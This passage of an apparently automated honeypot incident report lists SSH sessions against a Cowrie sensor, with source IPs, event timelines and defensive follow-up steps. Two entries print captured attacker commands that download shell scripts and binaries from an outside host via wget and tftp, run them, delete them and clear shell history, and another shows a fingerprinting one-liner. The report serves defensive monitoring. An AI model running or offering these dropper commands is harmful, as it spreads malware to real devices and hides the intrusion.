| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 11:41:24` | `cowrie.session.connect` |
| `2026-07-09 11:41:25` | `cowrie.client.version` |
| `2026-07-09 11:41:25` | `cowrie.client.kex` |
| `2026-07-09 11:41:32` | `cowrie.login.success` |
| `2026-07-09 11:41:35` | `cowrie.session.params` |
| `2026-07-09 11:41:35` | `cowrie.command.input` |
| `2026-07-09 11:41:36` | `cowrie.log.closed` |
| `2026-07-09 11:41:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02bf52ec5ef8

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-09 11:43 |
| **Last Seen** | 2026-07-09 11:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 11:43:13` | `cowrie.session.connect` |
| `2026-07-09 11:43:13` | `cowrie.client.version` |
| `2026-07-09 11:43:13` | `cowrie.client.kex` |
| `2026-07-09 11:43:14` | `cowrie.login.success` |
| `2026-07-09 11:43:14` | `cowrie.direct-tcpip.request` |
| `2026-07-09 11:43:14` | `cowrie.direct-tcpip.data` |
| `2026-07-09 11:43:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15aa9d66cad0

| Field | Detail |
|---|---|
| **Source IP** | `180.94.74[.]94` |
| **First Seen** | 2026-07-09 11:46 |
| **Last Seen** | 2026-07-09 11:46 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 11:46:17` | `cowrie.session.connect` |
| `2026-07-09 11:46:18` | `cowrie.client.version` |
| `2026-07-09 11:46:18` | `cowrie.client.kex` |
| `2026-07-09 11:46:20` | `cowrie.login.success` |
| `2026-07-09 11:46:20` | `cowrie.direct-tcpip.request` |
| `2026-07-09 11:46:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.94.74[.]94` to AbuseIPDB if not already reported
- [ ] Block `180.94.74[.]94` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2db79729c9f

| Field | Detail |
|---|---|
| **Source IP** | `196.189.124[.]229` |
| **First Seen** | 2026-07-09 11:46 |
| **Last Seen** | 2026-07-09 11:46 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 11:46:27` | `cowrie.session.connect` |
| `2026-07-09 11:46:27` | `cowrie.client.version` |
| `2026-07-09 11:46:27` | `cowrie.client.kex` |
| `2026-07-09 11:46:28` | `cowrie.login.success` |
| `2026-07-09 11:46:29` | `cowrie.direct-tcpip.request` |
| `2026-07-09 11:46:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.124[.]229` to AbuseIPDB if not already reported
- [ ] Block `196.189.124[.]229` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be8085b321e9

| Field | Detail |
|---|---|
| **Source IP** | `196.189.126[.]185` |
| **First Seen** | 2026-07-09 11:47 |
| **Last Seen** | 2026-07-09 11:47 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 11:47:27` | `cowrie.session.connect` |
| `2026-07-09 11:47:28` | `cowrie.client.version` |
| `2026-07-09 11:47:28` | `cowrie.client.kex` |
| `2026-07-09 11:47:30` | `cowrie.login.success` |
| `2026-07-09 11:47:30` | `cowrie.direct-tcpip.request` |
| `2026-07-09 11:47:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.126[.]185` to AbuseIPDB if not already reported
- [ ] Block `196.189.126[.]185` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ce93751beed

| Field | Detail |
|---|---|
| **Source IP** | `45.118.136[.]243` |
| **First Seen** | 2026-07-09 11:47 |
| **Last Seen** | 2026-07-09 11:47 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 11:47:36` | `cowrie.session.connect` |
| `2026-07-09 11:47:37` | `cowrie.client.version` |
| `2026-07-09 11:47:37` | `cowrie.client.kex` |
| `2026-07-09 11:47:39` | `cowrie.login.success` |
| `2026-07-09 11:47:40` | `cowrie.direct-tcpip.request` |
| `2026-07-09 11:47:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.118.136[.]243` to AbuseIPDB if not already reported
- [ ] Block `45.118.136[.]243` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7e583de42ed

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]114` |
| **First Seen** | 2026-07-09 11:48 |
| **Last Seen** | 2026-07-09 11:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 11:48:47` | `cowrie.session.connect` |
| `2026-07-09 11:48:47` | `cowrie.client.version` |
| `2026-07-09 11:48:47` | `cowrie.client.kex` |
| `2026-07-09 11:48:47` | `cowrie.login.success` |
| `2026-07-09 11:48:48` | `cowrie.session.params` |
| `2026-07-09 11:48:48` | `cowrie.command.input` |
| `2026-07-09 11:48:48` | `cowrie.log.closed` |
| `2026-07-09 11:48:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]114` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5f760af63cb

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-09 11:52 |
| **Last Seen** | 2026-07-09 11:52 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 11:52:12` | `cowrie.session.connect` |
| `2026-07-09 11:52:14` | `cowrie.client.version` |
| `2026-07-09 11:52:14` | `cowrie.client.kex` |
| `2026-07-09 11:52:19` | `cowrie.login.success` |
| `2026-07-09 11:52:23` | `cowrie.session.params` |
| `2026-07-09 11:52:23` | `cowrie.command.input` |
| `2026-07-09 11:52:25` | `cowrie.log.closed` |
| `2026-07-09 11:52:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a52f61fe821d

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-09 11:58 |
| **Last Seen** | 2026-07-09 11:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 11:58:00` | `cowrie.session.connect` |
| `2026-07-09 11:58:00` | `cowrie.client.version` |
| `2026-07-09 11:58:00` | `cowrie.client.kex` |
| `2026-07-09 11:58:00` | `cowrie.login.success` |
| `2026-07-09 11:58:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8cd339f16d15

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-09 11:58 |
| **Last Seen** | 2026-07-09 11:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 11:58:00` | `cowrie.session.connect` |
| `2026-07-09 11:58:00` | `cowrie.client.version` |
| `2026-07-09 11:58:00` | `cowrie.client.kex` |
| `2026-07-09 11:58:00` | `cowrie.login.success` |
| `2026-07-09 11:58:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e87464df6538

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-09 11:58 |
| **Last Seen** | 2026-07-09 11:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 11:58:06` | `cowrie.session.connect` |
| `2026-07-09 11:58:06` | `cowrie.client.version` |
| `2026-07-09 11:58:06` | `cowrie.client.kex` |
| `2026-07-09 11:58:06` | `cowrie.login.success` |
| `2026-07-09 11:58:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e69dc424e904

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-09 11:58 |
| **Last Seen** | 2026-07-09 11:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 11:58:06` | `cowrie.session.connect` |
| `2026-07-09 11:58:06` | `cowrie.client.version` |
| `2026-07-09 11:58:06` | `cowrie.client.kex` |
| `2026-07-09 11:58:06` | `cowrie.login.success` |
| `2026-07-09 11:58:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70819d802b3b

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]140` |
| **First Seen** | 2026-07-09 11:58 |
| **Last Seen** | 2026-07-09 11:59 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh, cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://83.168.69[.]141/p.sh; chmod 777 *; sh p.sh; tftp -g 83.168.69[.]141 -r tftp1.sh; chmod 777 *; sh tftp1.sh; rm -rf *.sh; history -c` |
| **Download Attempts** | hxxp://83.168.69[.]141/p.sh, hxxp://83.168.69[.]141/x86_64, hxxp://83.168.69[.]141/x86_64 |
| **Malware Analysis** | 85a17fe8e290a224a717445d0f5e819283567101a92945ea10069946dc7e19d8 (MEDIUM), 44689d3e1a7f460db2ecc14351c171f4910721257f83024c63cbc07f4e2b977c (LOW), 85338e737e8b8c9ff9742ebc5bb0b73d91d441774161ad936f14910259d985ba (MEDIUM), 0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6 (MEDIUM) |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 11:58:46` | `cowrie.session.connect` |
| `2026-07-09 11:58:46` | `cowrie.login.success` |
| `2026-07-09 11:58:47` | `cowrie.session.params` |
| `2026-07-09 11:58:48` | `cowrie.command.input` |
| `2026-07-09 11:58:48` | `cowrie.command.input` |
| `2026-07-09 11:58:48` | `cowrie.session.file_download` |
| `2026-07-09 11:58:49` | `cowrie.session.file_download` |
| `2026-07-09 11:58:49` | `cowrie.session.file_download.failed` |
| `2026-07-09 11:58:49` | `cowrie.session.file_download` |
| `2026-07-09 11:58:49` | `cowrie.session.file_download` |
| `2026-07-09 11:58:50` | `cowrie.session.file_download` |
| `2026-07-09 11:58:50` | `cowrie.session.file_download` |
| `2026-07-09 11:58:50` | `cowrie.session.file_download` |
| `2026-07-09 11:59:03` | `cowrie.log.closed` |
| `2026-07-09 11:59:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]140` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95bd45f2386f

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]114` |
| **First Seen** | 2026-07-09 11:59 |
| **Last Seen** | 2026-07-09 11:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 11:59:29` | `cowrie.session.connect` |
| `2026-07-09 11:59:29` | `cowrie.client.version` |
| `2026-07-09 11:59:30` | `cowrie.client.kex` |
| `2026-07-09 11:59:30` | `cowrie.login.success` |
| `2026-07-09 11:59:30` | `cowrie.session.params` |
| `2026-07-09 11:59:30` | `cowrie.command.input` |
| `2026-07-09 11:59:31` | `cowrie.log.closed` |
| `2026-07-09 11:59:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]114` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6471eb605e98

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]140` |
| **First Seen** | 2026-07-09 12:01 |
| **Last Seen** | 2026-07-09 12:01 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh, cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://83.168.69[.]141/p2.sh; chmod 777 *; sh p2.sh; tftp -g 83.168.69[.]141 -r tftp1.sh; chmod 777 *; sh tftp1.sh; rm -rf *.sh; history -c` |
| **Download Attempts** | hxxp://83.168.69[.]141/p2.sh, hxxp://83.168.69[.]141/armv7l, hxxp://83.168.69[.]141/armv7l |
| **Malware Analysis** | 155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f (MEDIUM), 40db9279ba409757c074048529be5bf8f141fa022489a965792e7f7de2223b78 (MEDIUM), 5f160094d291b41abe2e65a17c1b1c8a4aec041bf63c72cf01494b2ff37e20c9 (MEDIUM) |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 12:01:26` | `cowrie.session.connect` |
| `2026-07-09 12:01:27` | `cowrie.login.success` |
| `2026-07-09 12:01:27` | `cowrie.session.params` |
| `2026-07-09 12:01:29` | `cowrie.command.input` |
| `2026-07-09 12:01:29` | `cowrie.command.input` |
| `2026-07-09 12:01:29` | `cowrie.session.file_download` |
| `2026-07-09 12:01:29` | `cowrie.session.file_download` |
| `2026-07-09 12:01:29` | `cowrie.session.file_download.failed` |
| `2026-07-09 12:01:30` | `cowrie.session.file_download` |
| `2026-07-09 12:01:30` | `cowrie.session.file_download` |
| `2026-07-09 12:01:44` | `cowrie.log.closed` |
| `2026-07-09 12:01:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]140` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5838cf6f1f1

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-09 12:03 |
| **Last Seen** | 2026-07-09 12:03 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 12:03:02` | `cowrie.session.connect` |
| `2026-07-09 12:03:04` | `cowrie.client.version` |
| `2026-07-09 12:03:04` | `cowrie.client.kex` |
| `2026-07-09 12:03:09` | `cowrie.login.success` |
| `2026-07-09 12:03:12` | `cowrie.session.params` |
| `2026-07-09 12:03:12` | `cowrie.command.input` |
| `2026-07-09 12:03:14` | `cowrie.log.closed` |
| `2026-07-09 12:03:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec8d659c0948

| Field | Detail |
|---|---|
| **Source IP** | `186.235.193[.]170` |
| **First Seen** | 2026-07-09 12:07 |
| **Last Seen** | 2026-07-09 12:07 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 12:07:07` | `cowrie.session.connect` |
| `2026-07-09 12:07:07` | `cowrie.client.version` |
| `2026-07-09 12:07:07` | `cowrie.client.kex` |
| `2026-07-09 12:07:09` | `cowrie.login.success` |
| `2026-07-09 12:07:10` | `cowrie.direct-tcpip.request` |
| `2026-07-09 12:07:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.235.193[.]170` to AbuseIPDB if not already reported
- [ ] Block `186.235.193[.]170` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d92642a74824

| Field | Detail |
|---|---|
| **Source IP** | `94.205.250[.]78` |
| **First Seen** | 2026-07-09 12:07 |
| **Last Seen** | 2026-07-09 12:07 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 12:07:15` | `cowrie.session.connect` |
| `2026-07-09 12:07:16` | `cowrie.client.version` |
| `2026-07-09 12:07:16` | `cowrie.client.kex` |
| `2026-07-09 12:07:17` | `cowrie.login.success` |
| `2026-07-09 12:07:18` | `cowrie.direct-tcpip.request` |
| `2026-07-09 12:07:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.205.250[.]78` to AbuseIPDB if not already reported
- [ ] Block `94.205.250[.]78` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a85112f39c57

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]114` |
| **First Seen** | 2026-07-09 12:10 |
| **Last Seen** | 2026-07-09 12:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 12:10:07` | `cowrie.session.connect` |
| `2026-07-09 12:10:07` | `cowrie.client.version` |
| `2026-07-09 12:10:07` | `cowrie.client.kex` |
| `2026-07-09 12:10:07` | `cowrie.login.success` |
| `2026-07-09 12:10:08` | `cowrie.session.params` |
| `2026-07-09 12:10:08` | `cowrie.command.input` |
| `2026-07-09 12:10:08` | `cowrie.log.closed` |
| `2026-07-09 12:10:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]114` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1f0c4644019

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-09 12:11 |
| **Last Seen** | 2026-07-09 12:12 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 12:11:43` | `cowrie.session.connect` |
| `2026-07-09 12:11:44` | `cowrie.client.version` |
| `2026-07-09 12:11:44` | `cowrie.client.kex` |
| `2026-07-09 12:11:50` | `cowrie.login.success` |
| `2026-07-09 12:11:53` | `cowrie.session.params` |
| `2026-07-09 12:11:53` | `cowrie.command.input` |
| `2026-07-09 12:12:02` | `cowrie.log.closed` |
| `2026-07-09 12:12:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec42fb24b3ab

| Field | Detail |
|---|---|
| **Source IP** | `60.214.127[.]246` |
| **First Seen** | 2026-07-09 12:12 |
| **Last Seen** | 2026-07-09 12:12 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 12:12:44` | `cowrie.session.connect` |
| `2026-07-09 12:12:45` | `cowrie.client.version` |
| `2026-07-09 12:12:45` | `cowrie.client.kex` |
| `2026-07-09 12:12:50` | `cowrie.login.success` |
| `2026-07-09 12:12:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.214.127[.]246` to AbuseIPDB if not already reported
- [ ] Block `60.214.127[.]246` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a35caecf1caa

| Field | Detail |
|---|---|
| **Source IP** | `164.92.228[.]62` |
| **First Seen** | 2026-07-09 12:12 |
| **Last Seen** | 2026-07-09 12:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 12:12:50` | `cowrie.session.connect` |
| `2026-07-09 12:12:50` | `cowrie.client.version` |
| `2026-07-09 12:12:50` | `cowrie.client.kex` |
| `2026-07-09 12:12:51` | `cowrie.login.success` |
| `2026-07-09 12:12:51` | `cowrie.session.params` |
| `2026-07-09 12:12:51` | `cowrie.command.input` |
| `2026-07-09 12:12:52` | `cowrie.log.closed` |
| `2026-07-09 12:12:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `164.92.228[.]62` to AbuseIPDB if not already reported
- [ ] Block `164.92.228[.]62` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a02314b3704

| Field | Detail |
|---|---|
| **Source IP** | `117.211.15[.]106` |
| **First Seen** | 2026-07-09 12:12 |
| **Last Seen** | 2026-07-09 12:13 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 12:12:55` | `cowrie.session.connect` |
| `2026-07-09 12:12:56` | `cowrie.client.version` |
| `2026-07-09 12:12:56` | `cowrie.client.kex` |
| `2026-07-09 12:13:00` | `cowrie.login.success` |
| `2026-07-09 12:13:01` | `cowrie.direct-tcpip.request` |
| `2026-07-09 12:13:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.211.15[.]106` to AbuseIPDB if not already reported
- [ ] Block `117.211.15[.]106` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2a7640ae04b

| Field | Detail |
|---|---|
| **Source IP** | `164.92.228[.]62` |
| **First Seen** | 2026-07-09 12:15 |
| **Last Seen** | 2026-07-09 12:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 12:15:17` | `cowrie.session.connect` |
| `2026-07-09 12:15:17` | `cowrie.client.version` |
| `2026-07-09 12:15:17` | `cowrie.client.kex` |
| `2026-07-09 12:15:18` | `cowrie.login.success` |
| `2026-07-09 12:15:18` | `cowrie.session.params` |
| `2026-07-09 12:15:18` | `cowrie.command.input` |
| `2026-07-09 12:15:18` | `cowrie.log.closed` |
| `2026-07-09 12:15:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `164.92.228[.]62` to AbuseIPDB if not already reported
- [ ] Block `164.92.228[.]62` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-202b0c9f7d1f

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-09 12:15 |
| **Last Seen** | 2026-07-09 12:15 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
